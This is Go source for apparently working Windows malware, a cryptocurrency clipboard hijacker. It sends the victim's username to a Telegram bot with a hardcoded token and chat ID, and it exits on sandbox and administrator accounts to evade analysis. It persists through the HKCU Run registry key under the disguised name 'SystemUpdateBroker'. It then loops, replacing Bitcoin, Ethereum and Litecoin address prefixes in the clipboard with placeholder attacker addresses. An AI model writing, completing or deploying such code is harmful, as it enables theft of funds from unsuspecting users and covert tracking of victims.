package main

import (
	"fmt"
	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows/registry"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
)

func main() {

	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	bottoken := "8018399354:AAED048K57xNx-8AfaGqhHkzfTa-nZ2tGZA"
	chatid := "6836733049"
	message := ("New File ran, Username:" + user.Username + "\n")
	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
	data := url.Values{}
	data.Set("chat_id", chatid)
	data.Set("text", message)
	resp, err := http.PostForm(telegramurl, data)
	if err != nil {
		fmt.Println("failed too send info too telegram", err)
	}
	defer resp.Body.Close()

	blockedusers := map[string]bool{
		"admin":              true,
		"administrator":      true,
		"WDAGUtilityAccount": true,
	}

	if blockedusers[user.Username] {
		os.Exit(0)
	}

	exepath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	err = key.SetStringValue("SystemUpdateBroker", exepath)
	if err != nil {
		panic(err)
	}
	for {
		BTC := "bitcoin address here"
		ETH := "Etherium address here"
		LTC := "litecoin address here"
		ltcfmt := "ltc1"
		ethfmt := "0x"
		btcfmt := "bc1"
		content, err := clipboard.ReadAll()

		if err != nil {
			log.Fatal(err)
		}

		if content == btcfmt {
			clipboard.WriteAll(BTC)
		}
		if content == ethfmt {
			clipboard.WriteAll(ETH)
		}
		if content == ltcfmt {
			clipboard.WriteAll(LTC)
		}
	}

}
